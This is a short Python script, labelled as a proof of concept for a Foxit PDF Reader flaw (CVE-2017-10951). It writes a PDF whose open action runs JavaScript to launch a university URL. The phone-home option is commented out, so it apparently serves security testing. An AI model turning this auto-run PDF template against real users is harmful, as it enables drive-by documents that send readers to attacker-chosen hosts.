# -*- coding: utf-8 -*-
"""
Created on Thu Oct  6 20:45:36 2022

@author: santiago
"""

import sys

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

import io
import bz2
import base64

# Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
# Source: https://twitter.com/l33d0hyun/status/1448342241647366152 
# This sample contains no phone-home
def create_malpdf10(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
   app.launchURL("https://www.asu.edu/");
)>> trailer <</Root 1 0 R>>''')

if __name__ == "__main__":

 # try:
  #  host = sys.argv[1]
  #except IndexError as e:
  #    print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
  #    sys.exit(1)

  print("Creating PDF files..")
  
  create_malpdf10("PDF-asu-edu.pdf")
  
  print("Done.")
  